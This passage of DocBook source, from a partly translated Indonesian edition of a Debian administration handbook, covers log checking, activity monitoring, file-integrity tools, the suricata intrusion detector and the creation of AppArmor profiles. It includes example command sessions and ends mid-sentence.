	<para>Setiap pesan yang ditandai sebagai upaya crack atau sebuah peringatan keamanan (mengikuti aturan yang disimpan dalam berkas <filename>/etc/logcheck/violations.d/myfile</filename>) hanya dapat diabaikan oleh aturan di berkas <filename>/etc/logcheck/violations.ignore.d/myfile</filename> atau <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>ekstensi</replaceable></filename>.</para>
      </sidebar>

      <para>Suatu kejadian sistem selalu diberi sinyal kecuali aturan di salah satu dari direktori <filename>/etc/logcheck/ignore.d.{paranoid, server, workstation}/</filename> menyatakan bahwa kejadian tersebut harus diabaikan. Tentu saja, direktori yang diperhitungkan adalah hanya mereka yang tingkat verbositasnya sama atau lebih dari mode operasi yang dipilih.</para>
    </section>
    <section id="sect.monitoring-activity">
      <title>Memantau Aktivitas</title>
      <indexterm><primary>pemantauan</primary> <secondary>kegiatan</secondary></indexterm>
      <indexterm><primary>aktivitas, pemantauan</primary></indexterm>
      <section id="sect.real-time-monitoring">
        <title>Secara Real Time</title>

	<para><command>top</command> adalah alat interaktif yang menampilkan daftar proses yang sedang berjalan. Pengurutan baku berdasarkan banyaknya menggunakan prosesor pada saat ini  dan dapat diperoleh dengan tombol <keycap>P</keycap>. Urutan lain termasuk besarnya memori yamg diduduki (<keycap>M</keycap> kunci), oleh waktu total prosesor (kunci <keycap>T</keycap>), dan pengenal proses (<keycap>N</keycap> kunci). Kunci <keycap>k</keycap> memungkinkan mematikan suatu proses dengan memasukkan pengenal prosesnya. Kunci <keycap>r</keycap> memungkinkan <emphasis>pengaturan ulang nice</emphasis> proses, yaitu mengubah prioritas.</para>
        <indexterm><primary><command>top</command></primary></indexterm>

	<para>Ketika sistem tampaknya terbeban lebih, <command>top</command> adalah alat yang hebat untuk melihat proses yang bersaing untuk waktu prosesor atau mengkonsumsi terlalu banyak memori. Secara khusus, hal ini sering menarik untuk diperiksa jika proses yang memakan sumber daya cock dengan layanan nyata yang diketahui diwadahi oleh mesin ini. Proses tidak dikenal yang berjalan sebagai pengguna www-data akan menonjol dan mesti diselidiki, karena mungkin adalah suatu instansi perangkat lunak yang diinstal dan dijalankan pada sistem melalui kerentanan dalam aplikasi web.</para>

	<para><command>top</command> adalah alat yang sangat fleksibel dan halaman manualnya memberikan rincian tentang bagaimana menyesuaikan tampilan dan mengadaptasi ke kebutuhan pribadi dan kebiasaan seseorang.</para>

        <para>Alat grafis <command>gnome-system-monitor</command> mirip dengan <command>top</command> dan kurang lebih menyediakan fitur yang sama.</para>

        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
      </section>
      <section id="sect.monitoring-history">
        <title>Riwayat</title>
        <indexterm><primary>aktivitas, riwayat</primary></indexterm>

	<para>Beban prosesor, lalu lintas jaringan, dan ruang bebas disk adalah informasi yang terus-menerus berubah. Mencatat riwayat evolusi mereka sering berguna dalam menentukan persis bagaimana komputer digunakan.</para>
        <indexterm><primary>SNMP</primary></indexterm>
        <indexterm><primary>Simple Network Management Protocol</primary></indexterm>

	<para>Ada banyak alat khusus untuk tugas ini. Sebagian dapat mengambil data melalui SNMP (<emphasis>Simple Network Management Protocol</emphasis>) untuk memusatkan informasi ini. Manfaat tambahan adalah bahwa hal ini memungkinkan pengambilan data dari elemen-elemen jaringan yang mungkin bukan komputer untuk keperluan umum, seperti router jaringan atau switch.</para>

	<para>Buku ini membahas Munin secara cukup rinci (lihat <xref linkend="sect.munin" />) sebagai bagian dari <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" />. Debian juga menyediakan alat yang mirip, <emphasis role="pkg">cacti</emphasis>. Penggelarannya sedikit lebih rumit, karena didasarkan semata-mata pada SNMP. Meskipun memiliki antarmuka web, menangkap konsep yang terlibat dalam konfigurasi masih memerlukan usaha. Membaca dokumentasi HTML (<filename>/usr/share/doc/cacti/html/index.html</filename>) mesti dianggap sebagai prasyarat.</para>

        <sidebar>
          <title><emphasis>ALTERNATIF</emphasis> <command>mrtg</command></title>
          <indexterm><primary><command>mrtg</command></primary></indexterm>

	  <para><command>mrtg</command> (dalam paket yang bernama sama) adalah alat yang lebih tua. Meskipun ada beberapa sisi kasar, ini dapat mengumpulkan data historis dan menampilkan mereka sebagai grafik. Ini mencakup sejumlah skrip yang didedikasikan untuk pengumpulan data paling sering dipantau seperti beban prosesor, trafik jaringan, klik halaman web, dan sebagainya.</para>

	  <para>Paket-paket <emphasis role="pkg">mrtg-contrib</emphasis> dan <emphasis role="pkg">mrtgutils</emphasis> berisi contoh skrip-skrip yang dapat digunakan secara langsung.</para>
        </sidebar>
      </section>
    </section>
    <section>
      <title>Mendeteksi Perubahan</title>

      <para>Setelah sistem diinstal dan dikonfigurasi, dan selain peningkatan keamanan, biasanya tidak ada alasan bagi sebagian besar berkas dan direktori untuk berevolusi, kecuali data. Oleh karena itu menarik untuk memastikan bahwa berkas sebenarnya tidak berubah: setiap perubahan yang tidak terduga akan layak untuk diselidiki. Bagian ini menyajikan beberapa alat yang dapat memonitor berkas dan memperingatkan administrator ketika terjadi perubahan yang tidak terduga (atau hanya untuk membuat daftar perubahan tersebut).</para>
      <section id="sect.dpkg-verify">
        <title>Mengaudit Paket-paket dengan <command>dpkg --verify</command></title>
        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
        <sidebar>
          <title><emphasis>LEBIH JAUH</emphasis> Melindungi terhadap perubahan hulu</title>

	  <para><command>dpkg --verify</command> berguna dalam mendeteksi perubahan atas berkas-berkas yang berasal dari paket Debian, tetapi tidak akan berguna jika paket itu sendiri terkompromi, misalnya jika cermin Debian terkompromi. Melindungi terhadap serangan kelas ini melibatkan penggunaan sistem verifikasi tanda tangan digital APT (lihat <xref linkend="sect.package-authentication" />), dan hanya menginstal paket dari asal yang bersertifikat.</para>
        </sidebar>

        <para><command>dpkg --verify</command> (atau <command>dpkg -V</command>) adalah alat yang menarik karena memungkinkan mencari berkas terpasang mana yang telah dimodifikasi (mungkin oleh penyerang), tapi ini tidak boleh dipercaya begitu saja. Untuk melakukan tugasnya, dia bergantung pada checksum yang disimpan dalam basis data dpkg sendiri yang ada pada hard disk (dapat ditemukan di <filename>/var/lib/dpkg/info/<replaceable>paket</replaceable> .md5sums</filename>); penyerang yang menyeluruh karena itu akan memperbarui berkas ini sehingga mereka mengandung checksum baru untuk berkas yang dipalsukan.</para>

        <sidebar>
          <title><emphasis>KEMBALI KE DASAR</emphasis> Sidik jari berkas</title>
	  <indexterm><primary>sidik jari</primary></indexterm>
	  <indexterm><primary>jumlah kontrol</primary></indexterm>
	  <indexterm><primary>MD5</primary></indexterm>
	  <indexterm><primary>SHA1</primary></indexterm> 
          <para>As a reminder: a
          fingerprint is a value, often a number (even though in hexadecimal
          notation), that contains a kind of signature for the contents of a
          file. This signature is calculated with an algorithm (MD5 or SHA1
          being well-known examples) that more or less guarantee that even
          the tiniest change in the file contents implies a change in the
          fingerprint; this is known as the “avalanche effect”. This
          allows a simple numerical fingerprint to serve as a litmus test to
          check whether the contents of a file have been altered. These
          algorithms are not reversible; in other words, for most of them,
          knowing a fingerprint doesn't allow finding the corresponding
          contents. Recent mathematical advances seem to weaken the
          absoluteness of these principles, but their use is not called into
          question so far, since creating different contents yielding the
          same fingerprint still seems to be quite a difficult task.
          </para>
        </sidebar>

        <para>Menjalankan <command>dpkg -V</command> akan memverifikasi semua paket yang terpasang dan akan mencetak sebaris untuk setiap berkas yang gagal uji. Format keluaran sama dengan salah satu <command>rpm -V</command> dimana setiap karakter menandakan tes atas beberapa metadata spesifik. Sayangnya <command>dpkg</command> tidak menyimpan metadata yang diperlukan untuk sebagian besar tes dan dengan demikian akan menampilkan tanda tanya bagi mereka. Saat ini hanya tes checksum yang dapat menghasilkan "5" pada karakter ketiga (ketika gagal).</para>
        <screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput></screen>
        <para>Dalam contoh di atas, dpkg laporan perubahan untuk berkas layanan SSH yang dibuat oleh administrator ke berkas yang dikemas alih-alih menggunakan <filename>/etc/systemd/system/ssh.service</filename> yang sesuai (yang akan disimpan di bawah <filename>/etc</filename> seperti sebarang perubahan konfigurasi yang seharusnya). Ini juga menampilkan daftar beberapa berkas konfigurasi (diidentifikasi oleh huruf "c" di field kedua) yang telah dimodifikasi secara sah.</para>
      </section>

      <section id="sect.debsums">
        <title>Mengaudit Paket: <command>debsums</command> dan keterbatasannya</title>
        <indexterm><primary><command>debsums</command></primary></indexterm>

        <para><command>debsums</command> adalah nenek moyang <command>dpkg -V</command> dan dengan demikian sebagian besar usang. It memiliki keterbatasan yang sama dengan dpkg. Untungnya, beberapa batasan dapat diatasi (sedangkan dpkg tidak menawarkan cara mengatasi yang serupa).</para>

        <para>
          Since the data on the disk cannot be trusted, <command>debsums</command>
          offers to do its checks based on <filename>.deb</filename> files instead of
          relying on dpkg's database. To download trusted <filename>.deb</filename> files
          of all the packages installed, we can rely on APT's authenticated downloads.
	  This operation can be slow and tedious, and should therefore not be
	  considered a proactive technique to be used on a regular
          basis.
        </para>

        <screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>

	<para>Perhatikan bahwa contoh ini menggunakan perintah <command>grep-status</command> dari paket <emphasis role="pkg">dctrl-tools</emphasis>, yang tidak diinstal secara default.</para>
      </section>
      <section>
        <title>Memantau Berkas: AIDE</title>
        <indexterm><primary><emphasis role="pkg">aide</emphasis> (Debian package)</primary></indexterm>

	<para>Alat AIDE (<emphasis>Advanced Intrusion Detection Environment</emphasis>) memungkinkan memeriksa integritas berkas, dan mendeteksi perubahan terhadap citra yang direkam sebelumnya dari sistem yang berlaku. Citra ini disimpan sebagai basis data (<filename>/var/lib/aide/aide.db</filename>) yang berisi informasi yang relevan pada semua berkas sistem (sidik jari, izin, stempel waktu, dan seterusnya). Basis data ini pertama diinisialisasi dengan <command>aideinit</command>; ini kemudian digunakan setiap hari (oleh <filename>/etc/cron.daily/aide</filename> script) untuk memeriksa bahwa tidak ada yang relevan yang berubah. Ketika perubahan terdeteksi, AIDE mencata mereka dalam berkas log (<filename>/var/log/aide/*.log</filename>) dan mengirimkan temuannya ke administrator melalui surel.</para>

        <sidebar>
          <title><emphasis>DALAM PRAKTEK</emphasis> Melindungi basis data</title>

	  <para>Since AIDE uses a local database to compare the states of
	  the files, the validity of its results is directly linked to the
	  validity of the database. If an attacker gets root permissions on
	  a compromised system, they will be able to replace the database
	  and cover their tracks. A possible workaround would be to store
	  the reference data on read-only storage media.</para>
        </sidebar>

	<para>Many options in <filename>/etc/default/aide</filename> can be
	used to tweak the behavior of the <emphasis role="pkg">aide</emphasis> package. The AIDE configuration proper
	is stored in <filename>/etc/aide/aide.conf</filename> and
	<filename>/etc/aide/aide.conf.d/</filename> (actually, these files
	are only used by <command>update-aide.conf</command> to generate
	<filename>/var/lib/aide/aide.conf.autogenerated</filename>).
	Configuration indicates which properties of which files need to be
	checked. For instance, the contents of log files changes routinely,
	and such changes can be ignored as long as the permissions of these
	files stay the same, but both contents and permissions of
	executable programs must be constant. Although not very complex,
	the configuration syntax is not fully intuitive, and reading the
	<citerefentry><refentrytitle>aide.conf</refentrytitle>
	<manvolnum>5</manvolnum></citerefentry> manual page is therefore
	recommended.</para>

	<para>A new version of the database is generated daily in
	<filename>/var/lib/aide/aide.db.new</filename>; if all recorded
	changes were legitimate, it can be used to replace the reference
	database.</para>

        <sidebar>
          <title><emphasis>ALTERNATIF</emphasis> Tripwire dan Samhain</title>

	  <para>Tripwire is very similar to AIDE; even the configuration
	  file syntax is almost the same. The main addition provided by
	  <emphasis role="pkg">tripwire</emphasis> is a mechanism to sign
	  the configuration file, so that an attacker cannot make it point
	  at a different version of the reference database.</para>

	  <para>Samhain also offers similar features, as well as some
	  functions to help detecting rootkits (see the sidebar
	  <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />).
	  It can also be deployed globally on a network, and
	  record its traces on a central server (with a signature).</para>
        </sidebar>

        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
          <title><emphasis>LIHAT CEPAT</emphasis> Paket-paket <emphasis role="pkg">checksecurity</emphasis> dan <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>

	  <para>The first of these packages contains several small scripts
	  performing basic checks on the system (empty passwords, new
	  setuid files, and so on) and warning the administrator if
	  required. Despite its explicit name, an administrator should not
	  rely solely on it to make sure a Linux system is secure.</para>

	  <para>The <emphasis role="pkg">chkrootkit</emphasis> and
	  <emphasis role="pkg">rkhunter</emphasis> packages allow looking
	  for <emphasis>rootkits</emphasis> potentially installed on the
	  system. As a reminder, these are pieces of software designed to
	  hide the compromise of a system while discreetly keeping control
	  of the machine. The tests are not 100% reliable, but they can
	  usually draw the administrator's attention to potential
	  problems.</para>
        </sidebar>
      </section>
    </section>
    <section id="sect.intrusion-detection">
      <title>Mendeteksi Intrusi (IDS/NIDS)</title>
      <indexterm><primary>deteksi, intrusi</primary></indexterm>
      <indexterm><primary>deteksi intrusi</primary></indexterm>
      <indexterm><primary>IDS</primary></indexterm>
      <indexterm><primary>sistem deteksi intrusi</primary></indexterm>
      <indexterm><primary>NIDS</primary></indexterm>
      <indexterm><primary>IDS</primary><secondary>Jaringan</secondary></indexterm>

      <sidebar>
        <title><emphasis>KEMBALI KE DASAR</emphasis> Denial of service</title>
        <indexterm><primary>denial of service</primary></indexterm>

	<para>A “denial of service” attack has only one goal: to make a
	service unavailable. Whether such an attack involves overloading
	the server with queries or exploiting a bug, the end result is the
	same: the service is no longer operational. Regular users are
	unhappy, and the entity hosting the targeted network service
	suffers a loss in reputation (and possibly in revenue, for instance
	if the service was an e-commerce site).</para>

	<para>Such an attack is sometimes “distributed”; this usually
	involves overloading the server with large numbers of queries
	coming from many different sources so that the server becomes
	unable to answer the legitimate queries. These types of attacks
	have gained well-known acronyms: <acronym>DDoS</acronym> and
	<acronym>DoS</acronym> (depending on whether the denial of service
	attack is distributed or not).</para>
      </sidebar>

      <para><command>suricata</command> (in the Debian package of the same
      name) is a NIDS — a <emphasis>Network Intrusion Detection
      System</emphasis>. Its function is to listen to the network and try
      to detect infiltration attempts and/or hostile acts (including denial
      of service attacks). All these events are logged in multiple files
      in <filename>/var/log/suricata</filename>. There are third party tools
      (Kibana/logstash) to better browse all the data collected.
      <ulink type="block" url="http://suricata-ids.org" />
      <ulink type="block" url="https://www.elastic.co/products/kibana" />
      </para>
      <indexterm><primary><command>snort</command></primary></indexterm>
      <indexterm><primary><command>suricata</command></primary></indexterm>

      <sidebar>
        <title><emphasis>HATI-HATI</emphasis> Rentang aksi</title>

	<para>The effectiveness of <command>suricata</command> is limited by
	the traffic seen on the monitored network interface. It will
	obviously not be able to detect anything if it cannot observe the
	real traffic. When plugged into a network switch, it will therefore
	only monitor attacks targeting the machine it runs on, which is
	probably not the intention. The machine hosting
	<command>suricata</command> should therefore be plugged into the
	“mirror” port of the switch, which is usually dedicated to
	chaining switches and therefore gets all the traffic.</para>
      </sidebar>

      <para>
        Configuring suricata involves reviewing and editing
        <filename>/etc/suricata/suricata-debian.yaml</filename>, which is
        very long because each parameter is abundantly commented.
        A minimal configuration requires describing the range of addresses
        that the local network covers (<literal>HOME_NET</literal>
        parameter). In practice, this means the set of all potential
        attack targets. But getting the most of it requires reading it in
        full and adapting it to the local situation.
      </para>
      <para>
        On top of this, you should also edit
        <filename>/etc/default/suricata</filename> to define the network
        interface to monitor and to enable the init script (by setting
        <literal>RUN=yes</literal>). You might also want to set
        <literal>LISTENMODE=pcap</literal> because the default
        <literal>LISTENMODE=nfqueue</literal> requires further configuration
        to work properly (the netfilter firewall must be configured to
        pass packets to some user-space queue handled by suricata via the
        <literal>NFQUEUE</literal> target).
      </para>
      <para>
        To detect bad behaviour, <command>suricata</command> needs a set of
        monitoring rules: you can find such rules in the
        <emphasis role="pkg">snort-rules-default</emphasis> package.
        <command>snort</command> is the historical reference in the IDS
        ecosystem and <command>suricata</command> is able to reuse rules
        written for it.  Unfortunately that package is missing from
        <emphasis role="distribution">Debian Jessie</emphasis> and should
        be retrieved from another Debian release like <emphasis role="distribution">Testing</emphasis> or <emphasis role="distribution">Unstable</emphasis>.
      </para>
      <para>
        Alternatively, <command>oinkmaster</command> (in the package of the same name)
        can be used to download Snort rulesets from external sources.
      </para>
      <sidebar>
        <title><emphasis>LEBIH LANJUT</emphasis> Integrasi dengan <command>prelude</command></title>

	<para>Prelude brings centralized monitoring of security
	information. Its modular architecture includes a server (the
	<emphasis>manager</emphasis> in <emphasis role="pkg">prelude-manager</emphasis>) which gathers alerts
	generated by <emphasis>sensors</emphasis> of various types.</para>

	<para>Suricata dapat dikonfigurasi sebagai sebuah sensor. Kemungkinan lain adalah <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) yang memonitor berkas log (dengan cara yang mirip dengan <command>logcheck</command>, dijelaskan dalam <xref linkend="sect.logcheck" />).</para>
        <indexterm><primary><command>prelude</command></primary></indexterm>
      </sidebar>
    </section>
  </section>
  <section id="sect.apparmor">
    <title>Pengantar AppArmor</title>
    <indexterm><primary>AppArmor</primary></indexterm>
    <section id="sect.apparmor-principles">
      <title>Prinsip-prinsip</title>
      <para>
        AppArmor is a <emphasis>Mandatory Access Control</emphasis> (MAC)
        system built on Linux's LSM (<emphasis>Linux Security
          Modules</emphasis>) interface. In practice, the kernel queries
        AppArmor before each system call to know whether the process is
        authorized to do the given operation. Through this mechanism, AppArmor
        confines programs to a limited set of resources.
      </para>
      <indexterm><primary><emphasis>Mandatory Access Control</emphasis></primary></indexterm>
      <indexterm><primary><emphasis>Linux Security Modules</emphasis></primary></indexterm>
      <para>
        AppArmor applies a set of rules (known as “profile”) on each
        program. The profile applied by the kernel depends on the
        installation path of the program being executed.
        Contrary to SELinux (discussed in <xref linkend="sect.selinux" />),
        the rules applied do not depend on the user. All users 
        face the same set of rules when they are executing the same
        program (but traditional user permissions still apply and
        might result in different behaviour!).
      </para>
      <para>
        AppArmor profiles are stored in <filename>/etc/apparmor.d/</filename>
        and they contain a list of access control rules on resources that
        each program can make use of.
        The profiles are compiled and loaded into the kernel by the
        <command>apparmor_parser</command> command. Each profile can
        be loaded either in enforcing or complaining mode. The former
        enforces the policy and reports violation attempts, while the
        latter does not enforce the policy but still logs the system
        calls that would have been denied.
      </para>
    </section>
    <section id="sect.apparmor-setup">
      <title>Enabling AppArmor and managing AppArmor profiles</title>
      <para>
        AppArmor support is built into the standard kernels provided by Debian.
        Enabling AppArmor is thus just a matter of installing a few
        packages and adding some parameters to the kernel command line:
      </para>
      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
      <para>
        After a reboot, AppArmor is now functional and <command>aa-status</command>
        will confirm it quickly:
      </para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput></screen>
      <sidebar>
        <title><emphasis>NOTE</emphasis> More AppArmor profiles</title>
        <para>
          The <emphasis role="pkg">apparmor-profiles</emphasis> package
          contains profiles managed by the upstream AppArmor community.
          To get even more profiles you can install
          <emphasis role="pkg">apparmor-profiles-extra</emphasis> which
          contains profiles developed by Ubuntu and Debian.
        </para>
      </sidebar>
      <para>
        The state of each profile can be switched between
        enforcing and complaining with calls to <command>aa-enforce</command>
        and <command>aa-complain</command> giving as parameter either
        the path of the executable or the path to the policy file.
        Additionaly a profile can be entirely disabled with
        <command>aa-disable</command> or put in audit mode (to log
        accepted system calls too) with <command>aa-audit</command>.
      </para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
      </screen>
    </section>
    <section id="sect.apparmor-new-profile">
      <title>Membuat profil baru</title>
      <para>
        Even though creating an AppArmor profile is rather easy, most
        programs do not have one. This section will show you how to
        create a new profile from scratch just by using the target
        program and letting AppArmor monitor the system call it makes
        and the resources it accesses.
      </para>
      <para>
        The most important programs that need to be confined
        are the network facing programs as those are the most likely
        targets of remote attackers. That is why AppArmor conveniently
        provides an <command>aa-unconfined</command> command to list
        the programs which have no associated profile and which expose
        an open network socket. With the <literal>--paranoid</literal>
        option you get all unconfined processes that have at least one
        active network connection.
      </para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
      </screen>
      <para>
        In the following example, we will thus try to create a
        profile for <command>/sbin/dhclient</command>. For this
        we will use <command>aa-genprof dhclient</command>. It
        will invite you to use the application in another window
        and when done to come back to <command>aa-genprof</command>
        to scan for AppArmor events in the system logs and
        convert those logs into access rules. For each logged event,
        it will make one or more rule suggestions that you can
        either approve or further edit in multiple ways:
      </para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput></screen>
      <para>
        Note that the program does not display back the control
        characters that you type but for the clarity of the explanation I
        have included them in the previous transcript.
      </para>
      <calloutlist>
        <callout arearefs="aa-genprof-execute">
          <para>
            The first event detected is the execution of another program.
            In that case, you have multiple choices: you can run the program
            with the profile of the parent process (the “Inherit” choice),
            you can run it with its own dedicated profile (the
            “Profile” and the “Named” choices, differing only by the
            possibility to use an arbitrary profile name), you can run it
            with a sub-profile of the parent process (the “Child” choice),
            you can run it without any profile (the “Unconfined” choice)
            or you can decide to not run it at all (the “Deny” choice).
          </para>
          <para>
            Note that when you opt to run it under a dedicated profile
            that doesn't exist yet, the tool will create the missing profile
            for you and will make rule suggestions for that profile in the
            same run.
          </para>
        </callout>
        <callout arearefs="aa-genprof-capability">
          <para>
            At the kernel level, the special powers of the root user have been split
            in “capabilities”. When a system call requires a specific capability,
            AppArmor will verify whether the profile allows the program to make
            use of this capability.
          </para>
        </callout>
        <callout arearefs="aa-genprof-read">
          <para>
            Here the program seeks read permissions for
            <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command>
            detected that this permission was also granted by multiple
            “abstractions” and offers them as alternative choices. An
            abstraction provides a reusable set of access rules grouping
            together multiple resources that are commonly used together.
            In this specific case, the file is generally accessed through
            the nameservice related functions of the C library and we type
            “3” to first select the “#include
            &lt;abstractions/nameservice&gt;” choice and then “A” to allow
            it.
          </para>
        </callout>
        <callout arearefs="aa-genprof-write">
          <para>
            The program wants to create the <filename>/run/dhclient-eth0.pid</filename>
            file. If we allow the creation of this specific file only, the program
            will not work when the user will use it on another network interface.
            Thus we select “New” to replace the filename with the more generic
            “/run/dhclient*.pid” before recording the rule with “Allow”.
          </para>
        </callout>
        <callout arearefs="aa-genprof-other-profile">
          <para>
            Notice that this access request is not part of the dhclient
            profile but of the new profile that we created when we allowed
            <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> to
            run with its own profile.
          </para>
          <para>
            After having gone through all the logged events, the program
            offers to save all the profiles that were created during the
            run. In this case, we have two profiles that we save at once
            with “Save” (but you can save them individually too) before
            leaving the program with “Finish”.
          </para>
        </callout>
      </calloutlist>
      <para>
        <command>aa-genprof</command> is in fact only a smart wrapper
        around <command>aa-logprof</command>: it creates an empty profile,
        loads it in complain mode and then run
        <command>aa-logprof</command> which is a tool to update a profile
        based on the profile violations that have been logged. So you can
        re-run that tool later to improve the profile that you just
        created.
      </para>
      <para>
        If you want the generated profile to be complete, you should use the
